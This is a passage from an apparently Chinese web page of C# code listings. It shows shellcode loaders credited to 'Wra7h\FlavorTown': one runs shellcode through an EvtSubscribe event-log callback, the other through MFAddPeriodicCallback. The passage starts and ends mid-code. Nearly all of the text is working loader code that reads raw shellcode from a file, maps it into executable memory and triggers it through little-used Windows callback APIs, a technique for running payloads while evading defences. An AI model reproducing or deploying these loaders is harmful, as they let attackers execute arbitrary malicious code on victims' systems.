hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;EvtSubscribeToFutureEvents&nbsp;=&nbsp;<span class="hljs-number">1</span>;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hEvent&nbsp;=&nbsp;EvtSubscribe(IntPtr.Zero,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-string">"Application"</span>,&nbsp;<span class="hljs-string">"*[System/EventID=1]"</span>,&nbsp;IntPtr.Zero,&nbsp;IntPtr.Zero,&nbsp;hAlloc,&nbsp;EvtSubscribeToFutureEvents);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">long</span>&nbsp;test&nbsp;=&nbsp;CveEventWrite(<span class="hljs-string">"2022-123456"</span>,&nbsp;<span class="hljs-string">"Wra7h"</span>);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Threading.Thread.Sleep(<span class="hljs-number">10000</span>);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EvtClose(hEvent);<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">60</span><br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Wevtapi.dll"</span>)</span>]<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">EvtSubscribe</span>(<span class="hljs-params"><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hSession,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;SignalEvent,<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[MarshalAs(UnmanagedType.LPWStr</span>)]&nbsp;<span class="hljs-keyword">string</span>&nbsp;ChannelPath,<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-title">MarshalAs</span>(<span class="hljs-params">UnmanagedType.LPWStr</span>)]&nbsp;<span class="hljs-keyword">string</span>&nbsp;Query,<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Bookmark,<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Context,<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Flags)</span>;<br><span class="linenum hljs-number">71</span><br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Advapi32.dll"</span>)</span>]<br><span class="linenum hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">long</span>&nbsp;<span class="hljs-title">CveEventWrite</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>&nbsp;CveId,&nbsp;<span class="hljs-keyword">string</span>&nbsp;AdditionalDetails</span>)</span>;<br><span class="linenum hljs-number">74</span><br><span class="linenum hljs-number">75</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Wevtapi.dll"</span>)</span>]<br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">EvtClose</span>(<span class="hljs-params">IntPtr&nbsp;hEvent</span>)</span>;<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">78</span>}<br></code></pre>
<h1 id="h6cmfaddperiodiccallback"><span>6.回调函数注入 (C#) 通过 MFAddPeriodicCallback</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">MFAddPeriodicCallback</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;MFAddPeriodicCallback.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MFStartup(<span class="hljs-number">0x0002</span>&nbsp;&lt;&lt;&nbsp;<span class="hljs-number">16</span>&nbsp;|&nbsp;<span class="hljs-number">0x0070</span>,&nbsp;<span class="hljs-number">0x1</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwKey&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MFAddPeriodicCallback(hAlloc,&nbsp;IntPtr.Zero,&nbsp;<span class="hljs-keyword">out</span>&nbsp;dwKey);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Threading.Thread.Sleep(<span class="hljs-number">1000</span>);<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MFShutdown();<br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">49</span><br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">64</span><br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Mfplat.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;<span class="hljs-title">MFStartup</span>(<span class="hljs-params"><br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Version,<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwFlags</span>)</span>;<br><span class="linenum hljs-number">69</span><br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Mfplat.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;<span class="hljs-title">MFAddPeriodicCallback</span>(<span class="hljs-params"><br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;Callback,<br><span class="linenum hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;pContext,<br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwKey</span>)</span>;<br><span class="linenum hljs-number">75</span><br><span class="linenum hljs-number">76</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"Mfplat.dll"</span>,&nbsp;SetLastError&nbsp;=&nbsp;true)</span>]<br><span class="linenum hljs-number">77</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span 